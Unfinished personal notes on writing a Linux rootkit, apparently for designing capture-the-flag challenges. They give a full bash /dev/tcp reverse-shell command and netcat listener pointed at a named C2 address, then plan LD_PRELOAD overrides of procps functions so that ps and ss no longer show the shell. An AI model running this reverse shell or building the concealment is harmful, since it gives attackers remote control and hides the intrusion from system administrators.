# How to Write a Linux Rootkit

## 1. Prerequisites

### 1.0 What is a Rootkit?

Rootkits are **post-exploitation** malwares.

#### 1.0.1 Types

#### 1.0.1 Techniques

TODO: are these techniques correct?

**Function Hooking**

1. Locate the target function (in memory):
   - Find address of the target function in memory (rootkits should modify behavior of a function that is already loaded and running)
   - Ex. `dlsym()` in userspace to look up the symbol
2. Save a reference to the original function:
   - A rootkit should preserve the normal behavior of a system to not alter the user of it's presense
   - We don't want to reimplement existing normal functionality
3. Inject a hook (an evil wrapper around the target function):
   - The rootkit should redirect execution to the evil "wrapper" function every time the target function is called
   - The wrapper will perform is evil action (ex. hide a file), then call the saved original funcion to return normal output

Modern systems have tons of debugging and observability tooling that provides an easy interface to do function hooking, which we as attackers can abuse the fuck out of.

**Direct Kernel Object Manipulation (DKOM)**

TODO

**Inline Code Patching/ Code Caves**

TODO

**Filesystem Manipulation**

TODO

### 1.1 Scenario

You are an attacker. You have pwned a system and established a reverse shell.

```
SETUP:
[PWNED-VM] ----reverse shell---> [C2-SERVER(35.196.145.50)]
```

#### 1.1.1 Reverse Shell

_Reverse Shell TLDR: Netcat opens a TCP socket, binds it to a port, and pipes all traffic directly between stdin/stdout/stderr and the socket_

> Note:
> 0 = stdin
> 1 = stdout
> 2 = stderr

- 1. Create a listener on C2-SERVER
  - `nc -l -p 7070`
    - `-l`: "listen" mode
    - `-p 7070`: binds TCP port 7070
- What this command does:
  - Netcat calls `socket(AF_INET, SOCK_STREAM, 0)`, `bind()` to `0.0.0.0:7070`, `listen()`, then `accept()` for the first inbound connection
  - Once a client connects, `nc` reads from it's stdin and writes to the socket, and vice versa
- 2. Create a reverse shell on PWNED_VM
  - `/bin/bash -i >& /dev/tcp/35.196.145.50/7070 0>&1`
    - `/bin/bash -i`: launch bash in interactive mode (bash expects a tty/interactive session with prompts, etc.)
    - `/dev/tcp/35.196.145.50/7070`: bash-specific feature; when a redirect targets `/dev/tcp/HOST/PORT`, bash itself opens a TCP socket to `HOST:PORT` and associates it with the file descriptor you're redirecting
    - `>&`: redirect both stdout and stderr to a file
      - semantically `n>&m` means make fd `n` refer to the same underlying object as fd `m`
      - `>`: redirect stdout (fd 1) to a file
    - `>& /dev/tcp...`: redirect both stdout and stderr from bash over the TCP connection
    - `0>&1`: takes fd 0 (stdin) and points it to same socket that fd 1 already points to
  - might have to wrap it in `bash -c`: `bash -c '/bin/bash -i >& /dev/tcp/35.196.145.50/7070 0>&1'`

### 1.2 Goals

When the sysadmin runs `ps -aux` and `ss -tulnp`, they should see not see any output related to the reverse shell

#### 1.2.1 Current Output

**`ps auxf`**

- `a`: show processes from all users that are attached to a terminal (not just your own)
- `u`: display output in user-oriented format (adds human-readable columns like `USER` (owner), `%CPU`, `%MEM`, etc.)
- `x`: include processes without a controlling terminal (TTY); daemons and background jobs ofen't don't have a TTY; without `x`, can miss background services, reverse shells detached from terminal
- `f`: show a process tree

```bash
# removed all irreleevant output
asritha@asritha:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         813  0.0  0.2   6968  4608 tty1     Ss   18:00   0:00 /bin/login -p --
asritha      946  0.0  0.2   8652  5504 tty1     S    18:00   0:00  \_ -bash
asritha     1628  0.0  0.1   7340  3456 tty1     S    23:24   0:00      \_ bash -c bash -i >& /dev/tcp/35.196.145.50/7070 0>&1
asritha     1629  0.0  0.2   8660  5376 tty1     S+   23:24   0:00          \_ bash -i
```

**ss -tnp**

- `-t`: TCP
- `-p`: show process info
- `-n`: don't resolve names (show raw IP/port)

```bash
asritha@asritha:~$ sudo ss -tnp
State        Recv-Q        Send-Q               Local Address:Port                  Peer Address:Port         Process
ESTAB        0             0                      10.37.1.134:22                       10.37.1.1:56341         users:(("sshd",pid=1733,fd=4),("sshd",pid=1635,fd=4))
ESTAB        0             0                      10.37.1.134:40430                35.196.145.50:7070          users:(("bash",pid=1629,fd=2),("bash",pid=1629,fd=1),("bash",pid=1629,fd=0))

```

#### 1.2.2 `ps`

`which ps`
`file ps`

- everything in Linux is a file

#### 1.2.3 `ss`

`which ss`
`file ss`

### 1.3 Prerequisite Knowledge

#### 1.3.1 Kernelspace vs Userspace

- privelege levels
- syscalls

## 2. Userspace Rootkits

### 2.1 `LD_PRELOAD`

- `ldd ps`
- `nm -D /usr/bin/ps | grep procps`
  - look for "Undefined" means they are exported symbols from other binaries

- `/procps/src/`
  - `ps/`:
    - `common.h`: shared header file
    - `display.c`: display ps output
    - `global.c`: generic ps symbols and functions
    - `help.c`: ps help output
    - `output.c`: ps output definitions
    - `parser.c`: ps command options parser
    - `select.c`: ps process selection
    - `sortformat.c`: ps output sorting
    - `stacktrace.c`: ps debugging additions
  - `pidof.c`: utility for listing pids of running processes

#### 2.1.1 Tangent about symbols + `nm`

- `nm`: lists symbols from object files
  - symbols are names and addresses
  - symbols stored in symbol table (lives in the ELF file itself)
  - symbols can be of three types:
    - 1. Functions (text symbols):
      - names of functions like `main`, `printf`, etc.
      - point to code locations in `.text` section
        - `.text` section doesn't contain the addresses of functions from other libraries, instead they contain references (placeholders) that are resolved by the linker/loader using PLT/GOT mechanism at runtime
          - ex. `printf` would show up as undefined in the symbol table because `printf` is stored in `libc.so` (so `.text` section just has a placeholder jump, not `libc`'s actual address for `printf`)
    - 2. Variables (data symbols):
      - global or static variables
      - point into `.data` (initialized), `.bss` (uninitialized), `.rodata` (constants)
    - 3. Special/ metadata symbols:
      - start/end markers for `_start`, `_etext`, `_edata`
      - imported/exported function names for dynamic linking (like `printf@GLIBC_2.2.4`)
      - compiler generated symbols (`.L123` local labels, etc.)
  - symbols can be:
    - static symbols: internal to the object file, only visible if you compiled with `-g` or didn't strip (a stripped binary is one where full symbol table (`.symtab`) and debug info have been removed, so only dynamic symbol table (`.dynsym`) which is needed for runtime linking)
      - can run `file` to see if a binary is stripped or not
    - dynamic symbols: exposed to dynamic linker (`ld.so`); shared libraries need these to link at runtime
    - `nm -C a.out`: shows all symbols
    - `nm -D a.out`: shows dynamic symbols used in runtime linking
    - "dynamic symbols" can be both imported and exported
      - undefined symbols (exports) are functions/variables the binary needs from other libraries
      - defined libraries (import)

#TODO: combine with braindump

# `procps` (process of figuring out which function to overload)

### `procps` notes

- `https://www.man7.org/linux/man-pages/man3/procps.3.html`

- procps: is API to access sys level info in `/proc` virtual filesystem (so a way to view kernel exported views of its live system state, not "real" files on disk)

The following types of files in the `/proc` fs have the following interfaces:

- `/proc/diskstats`: per-block device I/O statisitcs
- `/proc/meminfo`: system-wide memory usage (RAM and swap)
- `/proc/slabinfo`: kernel slab allocator statistics, used for debugging kernel memory usage and leaks (lets you see how much memory is tired up in kernel obejct caches)
- `/proc/stat`: general system statistics isnc eboot
- `/proc/vmstat`: virtual memory subsystem statistics (deeper analysis of VM activity (ie. paging, reclaim, faults, etc.))

- realized don't need this

### `procps_pids` notes

- `procps_pids`: API to access process information in `/proc` filesystem
- link with `lproc2`

- `pids.h`

##### `readproc.h`

How did I get to `readproc.c`?

- `/proc/<pid>/task/` contains a subdirectory for each thread in the process
- `/proc/<pid>/stat`/`/proc/<pid>/task/<tid>/stat`: gives you single line of space-separated fields with status information about a process, starts with PID

- can use thread support in `ps` context to show individual threads (ex. `ps -T`)

- `dirent` interface: used to work with directory entries, to list files inside a directory
  - `struct dirent` represents one entry (file or subdirectory) within a directory
  - `DIR *`: handle to open directory stream, obtained with `opendir()`
  - functions:
    - `opendir(const char *name)`, returns `*DIR`
    - `readdir(DIR *dirp)`: returns pointer to next `struct dirent` in directory or `NULL` at end

**Structs**:

- `proc_t`: filled from `/proc/<pid>/stat`?
  - data structure that holds information about a single process or thread after it is read out of `/proc`
  - it is the _record_ that `readproc()` fills in from `/proc/[pid]`
  - process snapshot struct (in-memory representation of one `/proc` entry)
  - fields:
    - `ppid`: pid of parent process
- `PROCTAB`: data structure that holds persistent info `readproc` neads from `openproc` ("state object" used while iterating through processes or tasks in `/proc`, holds file descriptors, directory streams, current PIDs being scanned, function pointers, etc.)
  - `openproc()` allocates and initialized a `struct PROCTAB`
  - `readproc()` uses its fields (`finder`, `reader`, `taskreader`) to walk through `/proc` and fill in a `proc_t`
  - `closeproc()` frees it
  - the reason `PROCTAB` contains function pointers is bc there are multiple ways of walking processes and threads (ie. by PID list, directory scan of `/proc`, UID list, etc.) function pointers let traversal method be plugged in at runtime
  - `openproc()` sets up `PROCTAB`, will set the various `finder`/`reader` functions depending on options passed in
  - functions in it's fields:
    - `int (*finder) (struct PROCTAB *const, proc_t *const);`
    - `proc_t*(*reader) (struct PROCTAB *const, proc_t *const); `
    - iteration logic is separate from parsing logic (reader)
  - "TAB": shorthand for TABLE, historical reasons ("table of state/data/functions (context) used to iterate `/proc`")

**Functions**:

- `proc_t *simple_readproc(PROCTAB *resirict const PT, proc_t *restrict const p)`: takes in an empty `proc_t` with pid, then fills in rest of it?

- `openproc` (returns `PROCTAB`): `PROCTAB *openproc(unsigned flags, ...);`
  - various flags:
    - "Fill" flags: tell `libproc` which extra files to parse to populate more fields of `proc_t` (ex. `/proc/[pid]/status`), etc.
    - "Filter" flags: restrict which processes are return
      - `PROC_PID`: only PIDs in a 0-terminated list you pass inot `openproc(...)` #TODO: can use to overwrite?
      - `PROC_UID`: only UIDs in a list
    - "Edit/convert" flags: post process raw vectors into friendly strings
    - Others flags:

- TODO: HOW IS THE PROCTAB THE ITERATOR??

- `readproc`
  - `proc_t *readproc(PROCTAB *__restrict const PT, proc_t *__restrict p);`
  - returns the next `proc_t*` matching the filters, or NULL at end
  - if you pass `p == NULL`, library allocates a fresh `proc_t` for you
  - if you pass reusable buffer `p`, must be zero-initialized once, libproc will reuse and free/replace any internal pointers it attached on the previous iteration

- so far: you can think of `PROCTAB` as a `DIR *` for `/proc`, and `readproc()` like `readdir()`

Example Usage:

```C
// THIS IS CHAT CODE, so should check over
// 1) Library allocates each proc_t:
PROCTAB *pt = openproc(PROC_FILLSTAT|PROC_FILLMEM, NULL);
for (proc_t *p; (p = readproc(pt, NULL)) != NULL; ) {
    freeproc(p);
}
closeproc(pt);

// 2) With a reusable buffer:
PROCTAB *pt2 = openproc(PROC_FILLSTAT|PROC_FILLARG, NULL);
proc_t buf = {0}; // must be zero-initialized once, libproc will free/reallocate fields from then on between iteratiions (if you did `memset(&buf, 0, sizeof(buf))` before every readproc(), you would be erasing the library's pointers without calling free())
while (readproc(pt2, &buf)) { // returns &buf or NULL
    // use buf
}
closeproc(pt2);
```

##### `readproc.c`

- How did I get to `readproc.c` in the code flow?

- note that the `simple_*` ("traditional") naming convention is used to hint at forward-compatibility, not because they already hvae pidfd+ioctl support

**Functions**

- `static free_aquired(proc_t *p)`: free any additional dynamically aquired storage associated with a proc_t
- `static close_drfd`: close an open file descriptor and set it to -1 to prevent accidental reuse
- `static DIR* opendirat(int dirfd, const char *pathname)`:
  - opens a subdirectory `pathname` relative to an existing directory fd (`dirfd`)
  - uses `openat(2)` system call with flags:
    - `O_DIRECTORY`: fail unless target is directory
    - `O_RDONLY`: open read-only
  - passes resulting `fd` to `fopendir()`
    - `fdopendir` takes an already-open directory file descriptor and wraps it in a DIR\* stream object, `opendir` opens + closes
  - returns a `DIR *` (directory stream) suitable for `readdir()`/`closedir()`
  - file descriptors: int used by process to refer to an open file, directory, socket pipe, other kernel object. it is just an integer that is an index into th e kenrel's per-process file-descriptor table, where each entry is a pointer to an open file description object (which has the underlying inode, current file offset, etc.), file descriptor cna be used by read, write, etc; then destroyed by `close(fd)` which frees open file description

- `struct status_table_struct`: ??
- `static int status2proc`: ??
- `static int supgrps_from_supgids (proc_t *p)`: ??
- `static void oomscore2proc`: ??
- `static void oomadji2proc`: ??
- `static int stat2proc`: reads `/proc/*/stat` files
- `static void statm2proc`
- `static void io2proc`
- `static void smaps2proc`
- `static int file2str`
- `static char **file2strvec`
- `static int read_unvectored`: used when `PROC_EDITCGRPCVT`, etc. some other flags are available??
- 899 - 1221: seems like more utilities

- `static proc_t *simple_readproc(PROCTAB *restrict const PT, proc_t *restrict const p)`: "the traditional way" (just parsing the text files in procfs)
  - `readproc()` -> calls `simple_readproc` (it's internal reader?) for the procfs path
  - set of fields you get in `p` is controlled by FILL flags you passed to `openproc()` via `PT->flags`
  - "traditional": `/proc/<pid>` parsing, portable across all Linux versions
    - new alternatives:
      - `pidfds`: file descriptor that refers directly to a process, kernel gives you stable handle to the process
      - ioctls on pidfds: kernel devs slowly adding `ioctl()` operations on pidfds so you can query information about process without having to poen and parse `/proc/<pid>`
        - `ioctl` is an I/O control system call
        - normal syscalls (`read`, `write`) work on any file descriptor, but some kernel objects need extra APIs with `ioctl`: used to send device-specific commands to file descriptors

- `static proc_t *simple_readtask()`
- `static int simple_nextpid`: finds processes in `/proc` in the traditional way
- `static int simple_nexttid`: finds tasks in `/proc/*/task/` in the traditional way
- `static int listed_nextpid`: "finds" processes in a list that was given to `openproc()`
- `readproc`: return a pointer to a `proc_t` filled with requested info about the next process available matching the restriction set, else return a null pointer
  - if PID list given, only those files are searched for in `/proc`
- `readeither`: returns a pointer to a `proc_t` filled with requested info about the next unique process or task available; if no more available, return null pointer
- `PROCTAB *openproc`: initiate a process table scan
- `void closeproc`: terminate a process table scan

**Brainstorm for Override**:

- What functions are dynamically loaded in /usr/bin/ps from libproc?, but also remember, can override functions dynamically loaded by libproc also
- Does Om's approach cover all types of iteration, or only traversing the directory?
- Also look into `PROC_PID` filter flag as part of override???
- overwrite stuff used by `simple_nextpid` (so would skip over parsing that process entirely?)

condierations: make sure sure my override will work no matter what flags are in `PROCTAB` + make sure it still works with stuff in `listed_nextpid`

- options:
  - overwrite `readdir`? in `simple_nextpid`
    - check if this would work with `listed_nextpid`

# File Descriptors, all file shit relevant to the override

### File Descriptors

https://sebastianmarines.com/post/linux-file-descriptors-and-what-does-21-mean/

- everything file, use same ops. on everything
  - ex. read, write, close
- file descriptor: positive ints, handles to files, unique (in process context??)

- 0, 1, 2-> fds for std shit
  - open by default
  - pp is shell ? init script? kernel?

- fd: abstraction for an input/output stream (ex. file, network connection, etc)
  - unique per process
  - kernel has table of fds per process (file descirptor table); each entry has file info (ex. offset, etc.)
    - `fopen` gives you pointer to entry in that table
    - kernel gives lowest available fd when process opens file, so first fd is 3
    - `/proc/*/fd/`: contains symlinks for each file descriptors open by the process, name is fd number

### Inodes

- inode nums unique to filesystem
- filesystem id + inode number = unique id
- inode table, inode is index to metadata of file

### `iproute2` notes

- `ss`: `sockstat`, socket statistics

## 3. Kernel Space Rootkits

- run in ring 0
- more stealthy -> invisible to userspace applications
- more risky as a bug would crash the kernel, immediately alerting the user

**Resources**

- [Linux Rootkits](https://xcellerator.github.io)
- [Linux Rootkits - Multiple ways to hook syscall(s)](https://foxtrot-sq.medium.com)

### 3.1 Linux Kernel Modules/`ftrace`

#### 3.1.1 Linux Kernel Modules

#### 3.1.2 `ftrace`

- **`ftrace`**: used to hook kernel functions for debugging
-

## 4. Challenges

### 4.1 Hidden Port

A malicious process is listening for a reverse shell on a specific TCP port, but common tools like netstat, ss, and lsof do not show it because of a userspace rootkit. The flag can be obtained by finding the hidden listener and connecting to it.

### 4.2 Killsysms Ghost

The syscall table will be patched, player must detect which syscall is hooked, can run the syscall to print the flag name.

### 4.3 Ghost Rootkit

Find a self-hiding rootkit (via LKM), by running a blue team tool?

---

# TODO:

- fix number formatting
